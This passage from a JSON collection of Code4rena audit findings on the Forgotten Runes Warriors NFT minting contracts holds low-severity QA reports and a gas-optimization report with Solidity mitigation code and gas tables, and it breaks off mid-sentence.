`type(uint256).max`:\n\nhttps://forum.openzeppelin.com/t/using-the-maximum-integer-in-solidity/3000/13",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/257"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n\n## Table of Contents\n\n- [summary](#summary)\n- [Missing error messages in require statements of various functions](#missing-error-messages-in-require-statements-of-various-functions)\n- [Setters should emit an event](#setters-should-emit-an-event)\n- [Setters should check the input value](#setters-should-check-the-input-value)\n- [Unlocked pragma](#unlocked-pragma)\n\n\n\n\n# summary\n\n> Few vulnerabilities were found examining the contracts. The main concerns are with the absence of events in setters.\n>\n\n\n\n# Missing error messages in require statements of various functions\n\n## PROBLEM\n\nThe use of informative error messages helps troubleshoot exceptional conditions during transaction failures or unexpected behavior. Otherwise, it can be misleading and waste crucial time during emergency conditions, even in functions with access control.\n\n\n## SEVERITY\n\nLow\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n### ForgottenRunesWarriorsMinter.sol\n```\nForgottenRunesWarriorsMinter.sol:611: require(payable(vault).send(_amount));\nForgottenRunesWarriorsMinter.sol:620: require(payable(vault).send(address(this).balance));\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a short but helpful error message in require statements.\n\n\n# Setters should emit an event\n\n## PROBLEM\n\nAll setters should emit an event, so the Dapps can detect important changes.\n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nNone of the setters in either contract are emitting events\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nEmit events in all setters.\n\n\n\n\n# Setters should check the input value\n\n## PROBLEM\n\nSetters should check the input value - ie make revert if it is the zero address. In particular, setters that change the address of an ERC20 token used for transfers can, in case of a wrongful address being set, lead to loss of funds.\nIn the case of an uint256, if the variable is used as a denominator in some functions, setting it as zero can cause the function to revert. Here, `setDaDropInterval` does not check the zero value while `daDropInterval` is a denominator in `currentDaPrice()`, which is a function called during the Dutch Auction Phase in `bidSummon()`\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\nInstances include:\n\n\n### ForgottenRunesWarriorsMinter.sol\n\n```\nForgottenRunesWarriorsMinter.sol:543: function setWethAddress(address _newWethAddress)\n```\n\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nAdd a zero address check in setters, and a zero check in `setDaDropInterval`.\n\n\n# Unlocked pragma\n\n## PROBLEM\n\nBoth contracts have unlocked pragma (pragma solidity ^0.8.0) which are not fixed to a specific Solidity version. Locking the pragma helps ensure that contracts do not accidentally get deployed using a different compiler version with which they have been tested the most. \n\n\n\n## SEVERITY\n\nLow\n\n\n\n\n## PROOF OF CONCEPT\n\n```\nForgottenRunesWarriorsGuild:1: pragma solidity ^0.8.0;\nForgottenRunesWarriorsMinter:1: pragma solidity ^0.8.0;\n```\n\n## TOOLS USED\n\nManual Analysis\n\n\n\n## MITIGATION\n\nRemove `^`.\n",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/249"
    }
  },
  {
    "title": "QA Report",
    "body": "QA REPORTS\n\n1.\nTitle: Implement check effect interaction when calling `_safemint()`\n\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol#L103-L104\nAlthough I can't found any vulnerability in current implementation, its better doing state update before doing external call to prevent reentrancy\n\nRECOMMENDED MITIGATION STEP:\n```\n\tnumMinted += 1; // @audit-info: Better updating state before _safeMint()\n        _safeMint(recipient, tokenId);\n```\n\n\n2.\nTitle: Unnecessary `initialize()` function\n\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsGuild.sol#L52-L54\nThe function doesn't have any modifier (as how most initializer function implemented) which make it called only once when the contract is deployed, and it also have same goal as directly call `setMinter()` function. I recommend to initialize the `minter` in the `constructor()` (To prevent `minter` == address(0)), removing initial function, and use `setMinter()` instead of calling `initialize()` to set `minter` which can save both deployment and execution gas fee:\n\nRECOMMENDED MITIGATION STEP:\n```\n    constructor(string memory baseURI, address newMinter)\n        ERC721('ForgottenRunesWarriorsGuild', 'WARRIORS')\n    {\n        setBaseURI(baseURI);\n\tsetMinter(newMinter);\n    }\n\n```\n\n\n3.\nTitle: Throw false error\n\nOccurrences:\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L141\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L211\n\nIf the user input 0 it will throw error message: 'You can summon no more than 20 Warriors at a time'\nI recommend to change the error message: 'You can summon 0 or no more than 20 Warriors at a time'\n\n\n4.\nTitle: No check that `_newTime` > `daStartTime` (+ expected duration)\n\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L448-L450\nIf `mintListStartTime` < daStartTime (+ expected duration) is happened, [bidSummon()](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L138-L139) will be DOS function. It's quite easy to handle, but for better implementation I recommend to check it\n```\n    function setMintlistStartTime(uint256 _newTime) public onlyOwner {\n\trequire(_newTime > daStartTime + duration); //@auditInfo: var duration(estimated) can be determined by admin/owner. \n        mintlistStartTime = _newTime;\n    }\n```\nIt also can be implemented on all function which set `publicStartTime` and `claimsStartTime`\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L455-L464\n\nThose implementation were implemented in [setPhaseTime](https://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L480-L500) function (only for `newPublicStartTime` and `newClaimsStartTime`). But not when we call each function alone.\n\n\n\n5.\nTitle: Using SafeERC20 library in `ForgottenRunesWarriorsMinter.sol`\n\nhttps://github.com/code-423n4/2022-05-runes/blob/main/contracts/ForgottenRunesWarriorsMinter.sol#L629\n\nThere are some token which are not implementing current ERC20 standard (example: USDT, OmiseGo and BNB). Using SafeERC20 library will be nice to prevent them stuck when the transaction failed.\n```\nusing SafeERC20 for IERC20;\n\n\n    function forwardERC20s(IERC20 token, uint256 amount) public onlyOwner {\n        require(address(msg.sender) != address(0));\n        IERC20(token).safeTransfer(msg.sender, amount);\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-runes-findings",
      "repo": "https://github.com/code-423n4/2022-05-runes-findings",
      "url": "https://github.com/code-423n4/2022-05-runes-findings/issues/243"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "Two big ideas and a few minor ones. If you're willing to use smaller types for counting bids per user and prices, using a packed struct to store auction bid data can reduce bid and refund gas costs. Even if not, increasing the number of optimizer runs will reduce runtime gas costs for bids, mints, and refunds.\r\n\r\nIn the long and less impactful tail, you can optimize a few loops, change a few increments, and inline a couple variables.\r\n\r\n### Use packed struct for bid data\r\n\r\nUsing a packed struct to store a user's auction bid data saves significant gas by reducing storage reads in `bidSummon`, `issueRefunds`, and `selfRefund`.\r\n\r\nWe need to store three values related to a user's auction bid:\r\n- `daNumMinted`, the total number of tokens minted in the auction phase by address\r\n- `daAmountPaid`, the total amount paid by address\r\n- `daAmountRefunded`, the total amount refunded by address\r\n\r\nCurrently, we use three `(address => uint256)` mappings to store these values, so each one uses a full storage slot:\r\n\r\n[`ForgottenRunesWarriorsMinter.sol#L75`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L75)\r\n```solidity\r\n    /// @notice Tracks the total amount paid by a given address in the DA\r\n    mapping(address => uint256) public daAmountPaid;\r\n\r\n    /// @notice Tracks the total amount refunded to a given address for the DA\r\n    mapping(address => uint256) public daAmountRefunded;\r\n\r\n    /// @notice Tracks the total count of NFTs minted by a given address in the DA\r\n    mapping(address => uint256) public daNumMinted;\r\n```\r\n\r\nHowever, this data can comfortably fit into smaller types, so we can store all three values in a struct that will use a single storage slot. We want to find integer types for these values that can pack together into 256 bits.\r\n\r\nThere is a known upper bound on `daNumMinted`: even if a single address claims all possible tokens, it won't exceed the `maxDaSupply` of 8000. Even if the auction supply increases, it can't exceed the fixed total supply of 16000. This means we can safely fit each user's `daNumMinted` into a `uint16` (max value 65535). We can't go lower, as it's possible for one address to mint more than `type(uint8).max` (255) tokens.\r\n\r\nThis leaves us to find a packable type for the two prices: `daAmountPaid` and `daAmountRefunded`. We have 240 bits remaining (256 - 16), and could use a `uint120` for these two values. However, since we're going to be casting integer values, it's a good idea to use OpenZeppelin's `SafeCast` library, which checks for overflow when we convert a type. The largest type this library supports that will pack with `daNumMinted` in a single slot is `uint96`.\r\n\r\nIs this big enough for `daAmountPaid` and `daAmountRefunded`? The `uint96` type stores a max value equivalent to around 79 billion ether:\r\n\r\n```\r\n »  type(uint96).max\r\n79228162514264337593543950335\r\n »  type(uint96).max / (1 ether)\r\n79228162514\r\n```\r\n\r\nHowever, we need enough room to multiply number minted by final price and fit the result in a `uint96`:\r\n\r\n[`ForgottenRunesWarriorsMinter.sol#388`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L388)\r\n```\r\n    function refundOwed(address minter) public view returns (uint256) {\r\n        uint256 totalCostOfMints = finalPrice * daNumMinted[minter];\r\n        uint256 refundsPaidAlready = daAmountRefunded[minter];\r\n        return daAmountPaid[minter] - totalCostOfMints - refundsPaidAlready;\r\n    }\r\n```\r\n\r\nLet's take the more generous upper bound on `daNumMinted`: even if the mint supply parameters change, nobody can possibly mint more than 16000. So what is the max `finalPrice` value that fits? We want to solve for `uint96 totalCostOfMints = finalPrice * 16000`, so we can take `type(uint96).max / 16000` (and convert it to ether):\r\n\r\n```\r\n »  type(uint96).max / (16000 ether)\r\n4951760\r\n```\r\n\r\nAs long as we keep final price constrained to a value less than 4,951,760 ETH, there should be room to calculate prices using our packed data. Since it's likely to actually be between 2.5 and 0.6 ETH, we're all good.\r\n\r\nWe can replace the three mappings above with a single \"bids\" mapping and packed structs:\r\n\r\n```solidity\r\n    struct Bid {\r\n        uint16 daNumMinted;\r\n        uint96 daAmountPaid;\r\n        uint96 daAmountRefunded;\r\n    }\r\n    mapping(address => Bid) public daBids;\r\n```\r\n\r\nSince these were previously public state variables with default getters, we can introduce view functions to read these values if necessary:\r\n\r\n```solidity\r\n    function daNumMinted(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daNumMinted;\r\n    }\r\n\r\n    function daAmountPaid(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daAmountPaid;\r\n    }\r\n\r\n    function daAmountRefunded(address bidder) external view returns (uint256) {\r\n        return daBids[bidder].daAmountRefunded;\r\n    }\r\n```\r\n\r\nThe current code in `ForgottenRunesWarriorsMinter#bidSummon` will perform two `SLOAD`s and two `SSTORE`s to update the bid data by user: one read from storage, and one write to storage of the updated value per mapping.\r\n\r\n```solidity\r\n        daMinters.push(msg.sender);\r\n        daAmountPaid[msg.sender] += msg.value;\r\n        daNumMinted[msg.sender] += numWarriors;\r\n        numSold += numWarriors;\r\n```\r\n\r\nWe can save an `SSTORE` by updating the bid in memory and writing it once:\r\n\r\n```solidity\r\n        daMinters.push(msg.sender);\r\n\r\n        Bid memory bid = daBids[msg.sender];\r\n        bid.daAmountPaid += SafeCast.toUint96(msg.value);\r\n        bid.daNumMinted += SafeCast.toUint16(numWarriors);\r\n        daBids[msg.sender] = bid;\r\n\r\n        numSold += numWarriors;\r\n```\r\n\r\nRemember to import the `SafeCast` library:\r\n\r\n```solidity\r\nimport \"@openzeppelin/contracts/utils/math/SafeCast.sol\";\r\n```\r\n\r\nSafeCast will revert with an error in this function if `msg.value` or `numWarriors` cannot be safely downcast. We know `numWarriors` is less than 20 since we check in a `require` statement. `msg.value` could theoretically be too big, but it would require sending 79 billion ETH. (Congratulations on your mint!)\r\n\r\nWe'll also need to update refunds to read from the new struct.\r\n\r\nHere's the existing code:\r\n\r\n[`ForgottenRunesWarriorsMinter.sol#L376`](https://github.com/code-423n4/2022-05-runes/blob/060b4f82b79c8308fe65674a39a07c44fa586cd3/contracts/ForgottenRunesWarriorsMinter.sol#L376)\r\n```solidity\r\n    function _refundAddress(address minter) private {\r\n        uint256 owed = refundOwed(minter);\r\n        if (owed > 0) {\r\n            daAmountRefunded[minter] += owed;\r\n            _safeTransferETHWithFallback(minter, owed);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @notice returns the amount owed the address\r\n     * @param minter address the address of the account that wants a refund\r\n     */\r\n    function refundOwed(address minter) public view returns (uint256) {\r\n        uint256 totalCostOfMints = finalPrice * daNumMinted[minter];\r\n        uint256 refundsPaidAlready = daAmountRefunded[minter];\r\n        return daAmountPaid[minter] - totalCostOfMints - refundsPaidAlready;\r\n    }\r\n```\r\n\r\nThe `refundOwed` function uses all three bid values: `daNumMinted`, `daAmountPaid`, and `daAmountRefunded`. Instead of four `SLOAD`s, we can load the bid with just two `SLOAD`s (one for the whole bid struct, and one for `finalPrice`). This has a significant impact when iterating over many refunds:\r\n\r\n```solidity\r\n    /**\r\n     * @notice returns the amount owed the address\r\n     * @param minter address the address of the account that wants a refund\r\n     */\r\n    function refundOwed(address minter) public view returns (uint256) {\r\n        Bid memory bid = daBids[minter];\r\n        return bid.daAmountPaid - (finalPrice * bid.daNumMinted) - bid.daAmountRefunded;\r\n    }\r\n```\r\n\r\nWe won't save gas in `_refundAddress` (this still requires one `SLOAD` to read and one `SSTORE` to set), but we do need to update the code to cast the calculated refund amount to `uint96`:\r\n\r\n```solidity\r\n    function _refundAddress(address minter) private {\r\n        uint256 owed = refundOwed(minter);\r\n        if (owed > 0) {\r\n            daBids[minter].daAmountRefunded += SafeCast.toUint96(owed);\r\n            _safeTransferETHWithFallback(minter, owed);\r\n        }\r\n    }\r\n```\r\n\r\nThis is a big change, but it has a significant impact, especially on the gas cost of refunds.\r\n\r\nGas report before:\r\n\r\n```\r\n·------------------------------------------------------------|---------------------------|-------------|-----------------------------·\r\n|                    Solc version: 0.8.6                     ·  Optimizer enabled: true  ·  Runs: 200  ·  Block limit: 30000000 gas  │\r\n·····························································|···························|·············|······························\r\n|  Methods                                                                                                                           │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  Contract                      ·  Method                   ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  burn                     ·          -  ·          -  ·      31294  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  initialize               ·      46261  ·      46273  ·      46272  ·           90  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  mint                     ·      61624  ·      95824  ·      82999  ·            4  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setBaseURI               ·          -  ·          -  ·      31993  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setMinter                ·          -  ·          -  ·      46157  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setProvenanceHash        ·          -  ·          -  ·      46855  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadAttributes         ·          -  ·          -  ·      23987  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadImage              ·          -  ·          -  ·      23975  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  withdrawAll              ·          -  ·          -  ·      23593  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  bidSummon                ·     158591  ·     755809  ·     285939  ·           18  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  claimSummon              ·          -  ·          -  ·     158179  ·            6  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  issueRefunds             ·      69745  ·     143756  ·     115139  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  mintlistSummon           ·     126115  ·     160315  ·     151765  ·            8  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  pause                    ·          -  ·          -  ·      27732  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  publicSummon             ·     110840  ·     654549  ·     490754  ·           20  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  selfRefund               ·          -  ·          -  ·      62257  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimlistMerkleRoot   ·          -  ·          -  ·      46109  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimsStartTime       ·          -  ·          -  ·      28703  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaDropInterval        ·          -  ·          -  ·      28637  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaPriceCurveLength    ·          -  ·          -  ·      28660  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaStartTime           ·          -  ·          -  ·      28657  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setFinalPrice            ·      28723  ·      28783  ·      28779  ·           15  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxDaSupply           ·          -  ·          -  ·      28701  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForClaim           ·          -  ·          -  ·      28679  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForSale            ·          -  ·          -  ·      28636  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist1MerkleRoot   ·          -  ·          -  ·      46195  ·            9  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist2MerkleRoot   ·          -  ·          -  ·      46174  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlistStartTime     ·          -  ·          -  ·      28680  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPhaseTimes            ·      36598  ·      44998  ·      43987  ·           50  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPublicStartTime       ·          -  ·          -  ·      28679  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setSelfRefundsStartTime  ·      28702  ·      28738  ·      28720  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setStartPrice            ·          -  ·          -  ·      28637  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setVaultAddress          ·      26270  ·      29070  ·      28510  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWarriorsAddress       ·          -  ·          -  ·      29007  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWethAddress           ·          -  ·          -  ·      29004  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  teamSummon               ·     103853  ·     623637  ·     363745  ·            4  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  unpause                  ·          -  ·          -  ·      27748  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdraw                 ·          -  ·          -  ·      35364  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdrawAll              ·          -  ·          -  ·      35074  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  Deployments                                               ·                                         ·  % of limit   ·             │\r\n·····························································|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild                               ·          -  ·          -  ·    2023631  ·        6.7 %  ·          -  │\r\n·····························································|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter                              ·    2738151  ·    2738175  ·    2738173  ·        9.1 %  ·          -  │\r\n·------------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\r\n```\r\n\r\nGas report after:\r\n\r\n```\r\n·------------------------------------------------------------|---------------------------|-------------|-----------------------------·\r\n|                    Solc version: 0.8.6                     ·  Optimizer enabled: true  ·  Runs: 200  ·  Block limit: 30000000 gas  │\r\n·····························································|···························|·············|······························\r\n|  Methods                                                                                                                           │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  Contract                      ·  Method                   ·  Min        ·  Max        ·  Avg        ·  # calls      ·  usd (avg)  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  burn                     ·          -  ·          -  ·      31294  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  initialize               ·      46261  ·      46273  ·      46272  ·           90  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  mint                     ·      61624  ·      95824  ·      82999  ·            4  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setBaseURI               ·          -  ·          -  ·      31993  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setMinter                ·          -  ·          -  ·      46157  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  setProvenanceHash        ·          -  ·          -  ·      46855  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadAttributes         ·          -  ·          -  ·      23987  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  uploadImage              ·          -  ·          -  ·      23975  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild   ·  withdrawAll              ·          -  ·          -  ·      23593  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  bidSummon                ·     154292  ·     734410  ·     268340  ·           18  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  claimSummon              ·          -  ·          -  ·     158201  ·            6  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  issueRefunds             ·      48980  ·     122991  ·      86068  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  mintlistSummon           ·     126048  ·     160248  ·     151698  ·            8  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  pause                    ·          -  ·          -  ·      27754  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  publicSummon             ·     110862  ·     654571  ·     490776  ·           20  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  selfRefund               ·          -  ·          -  ·      41492  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimlistMerkleRoot   ·          -  ·          -  ·      46109  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setClaimsStartTime       ·          -  ·          -  ·      28703  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaDropInterval        ·          -  ·          -  ·      28659  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaPriceCurveLength    ·          -  ·          -  ·      28660  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setDaStartTime           ·          -  ·          -  ·      28679  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setFinalPrice            ·      28636  ·      28696  ·      28692  ·           15  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxDaSupply           ·          -  ·          -  ·      28723  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForClaim           ·          -  ·          -  ·      28701  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMaxForSale            ·          -  ·          -  ·      28636  ·            3  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist1MerkleRoot   ·          -  ·          -  ·      46109  ·            9  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlist2MerkleRoot   ·          -  ·          -  ·      46196  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setMintlistStartTime     ·          -  ·          -  ·      28702  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPhaseTimes            ·      36598  ·      44998  ·      43987  ·           50  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setPublicStartTime       ·          -  ·          -  ·      28701  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setSelfRefundsStartTime  ·      28635  ·      28671  ·      28653  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setStartPrice            ·          -  ·          -  ·      28637  ·            2  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setVaultAddress          ·      26292  ·      29092  ·      28532  ·            5  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWarriorsAddress       ·          -  ·          -  ·      29007  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  setWethAddress           ·          -  ·          -  ·      29026  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  teamSummon               ·     103875  ·     623659  ·     363767  ·            4  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  unpause                  ·          -  ·          -  ·      27748  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdraw                 ·          -  ·          -  ·      35364  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter  ·  withdrawAll              ·          -  ·          -  ·      35096  ·            1  ·          -  │\r\n·································|···························|·············|·············|·············|···············|··············\r\n|  Deployments                                               ·                                         ·  % of limit   ·             │\r\n·····························································|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsGuild                               ·          -  ·          -  ·    2023631  ·        6.7 %  ·          -  │\r\n·····························································|·············|·············|·············|···············|··············\r\n|  ForgottenRunesWarriorsMinter                              ·    2924973  ·    2924997  ·    2924995  ·        9.7 %  ·          -  │\r\n·------------------------------------------------------------|-------------|-------------|-------------|---------------|-------------·\r\n```\r\n\r\n### Increase optimizer runs\r\n\r\nConsider increasing the number of configured optimizer runs above 200. This value represents an optimize-for-contract-size/optimize-for-runtime-gas trade-off, and selecting a larger value will reduce gas usage of mint and refund functions while increasing the one time gas cost of contract deployment.\r\n\r\n### Use unchecked counter increments in loops\r\n\r\nThis is a minor optimization, but it can save a bit of gas in the hottest loops (like minting batches, and especially issuing 